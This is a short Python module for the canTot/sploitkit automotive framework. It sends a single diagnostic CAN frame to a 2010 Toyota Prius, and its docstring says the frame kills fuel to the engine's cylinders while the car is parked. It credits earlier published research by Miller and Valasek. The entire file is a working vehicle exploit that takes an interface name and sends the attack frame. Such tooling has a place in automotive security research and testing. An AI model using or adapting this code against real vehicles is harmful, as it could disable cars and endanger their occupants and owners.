from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class prius_park_killEngine(Module):
    """ This module will kill the fuel to individual or all cylinders in the internal 
    combustion engine of a Toyota Prius 2010 but requires it to be parked.

    Author:  shipcod3 # canTot module
    Credits: Charlie Miller and Chris Valasek # Original Research
    Reference: https://ioactive.com/pdfs/IOActive_Adventures_in_Automotive_Networks_and_Control_Units.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        frame = can.Frame(0x7E0)
        frame.data = [0x06,0x30,0x1C,0x00,0x0F,0xA5,0x01,0x00]
        print("[*] Sending a packet that will kill fuel to all the cylinders to the ICE.")
        dev.send(frame)
        pass